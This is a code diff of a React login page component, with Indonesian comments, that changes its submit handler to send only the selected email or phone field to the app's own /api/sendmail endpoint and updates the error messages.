@@ -41,31 +41,35 @@ export default function LoginPage() {
   const isInvalid = useEmail ? email.trim() === "" : phone.trim().length < 14;
 
   // submit → kirim API lalu popup
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (isInvalid || isDisabled) return;
-    setIsDisabled(true);
+ // submit → kirim API lalu popup
+const handleSubmit = async (e) => {
+  e.preventDefault();
+  if (isInvalid || isDisabled) return;
+  setIsDisabled(true);
 
-    try {
-      const res = await fetch("/api/sendmail", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, phone }),
-      });
-      const data = await res.json();
+  // Kirim hanya field yang dipilih
+  const payload = useEmail ? { email } : { phone };
 
-      if (data.success) {
-        setShowPopup(true);
-      } else {
-        alert("Gagal mengirim email!");
-      }
-    } catch (err) {
-      console.error(err);
-      alert("Terjadi error saat kirim email");
-    } finally {
-      setIsDisabled(false);
+  try {
+    const res = await fetch("/api/sendmail", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+    const data = await res.json();
+
+    if (data.success) {
+      setShowPopup(true);
+    } else {
+      alert("Gagal mengirim data!");
     }
-  };
+  } catch (err) {
+    console.error(err);
+    alert("Terjadi error saat kirim data");
+  } finally {
+    setIsDisabled(false);
+  }
+};
 
   // tombol unlock → redirect ke /login
   const handleUnlock = () => {
